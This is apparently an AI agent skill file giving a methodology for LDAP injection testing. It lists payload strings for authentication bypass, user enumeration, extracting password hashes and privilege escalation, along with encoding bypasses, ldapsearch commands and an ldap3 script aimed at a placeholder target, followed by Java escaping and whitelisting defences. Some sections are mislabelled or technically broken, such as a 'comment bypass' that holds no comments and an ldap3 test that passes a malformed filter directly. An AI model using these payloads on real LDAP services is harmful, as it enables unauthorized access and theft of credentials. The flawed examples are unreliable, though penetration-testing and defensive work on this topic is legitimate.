---
name: ldap-injection-testing
Description: Professional skills and methodology for LDAP injection vulnerability testing
version: 1.0.0
---

# LDAP injection vulnerability testing

## Overview

LDAP injection is a vulnerability similar to SQL injection. It exploits the structural flaws of LDAP query statements, which may lead to information leakage, permission bypass, etc. This skill provides detection, utilization and protection methods for LDAP injection.

## Vulnerability principle

The application directly splices user input into the LDAP query statement without sufficient validation and filtering, allowing attackers to modify the query logic.

**Dangerous code examples:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query syntax

**Basic query:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special characters

**Characters that need to be escaped:**
- `(` `)` - brackets
- `*` - wildcard character
- `\` - escape character
- `/` - path separator
- `NUL` - null character

## Test method

### 1. Identify LDAP input points

**Common features:**
- User login
- User search
- Catalog browsing
- Permission verification

### 2. Basic detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication bypass

**Basic Bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information leakage

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Get attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Leverage technology

### Authentication bypass

**Method 1: Logic bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: matches all users
```

**Method 2: Annotation Bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: Wildcard**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information leakage

**Enumerate all users:**
```
Search: *)(cn=*
Result: Return all cn attributes
```

**Get password hash:**
```
Search: *)(|(cn=*)(userPassword=*
Result: User and password hashes returned
```

**Get sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: Multiple sensitive attributes returned
```

### Privilege Elevation

**Modify query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: Possible bypass of permission check
```

## Bypass technology

### Encoding bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment bypass

**Usage Notes:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null character injection

**Use NULL byte:**
```
*))%00
```

## Tool usage

### JXplorer

**Graphical LDAP client:**
- Connect to LDAP server
- Browse the directory structure
- Perform query testing

### ldapsearch

```bash
#Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept LDAP query requests
2. Modify query parameters
3. Observe the response results

### Python script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Validation and reporting

### Verification steps

1. Confirm that you can control LDAP queries
2. Verification authentication bypass or information leakage
3. Assess the impact (unauthorized access, data leakage, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and input parameters
- LDAP query construction method
- Complete exploitation steps and PoC
- Fix suggestions (input validation, parameterized queries, etc.)

## Protective measures

### Recommended plan

1. **Input verification**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized query**
   ```java
   // Using the parameterization feature of the LDAP API
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build queries using the API
   ```

3. **Whitelist Verification**
   ```java
   // Only specific characters allowed
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Minimum Privileges**
- LDAP connections use least privileged accounts
- Limit the properties that can be queried
- Use access control lists

5. **Error handling**
- Do not return detailed error information
- Unified error response
- Record error log

## Notes

- Only conducted in an authorized testing environment
- Pay attention to the syntax differences between different LDAP servers
- Avoid impacting directories during testing
- Understand the configuration of the target LDAP server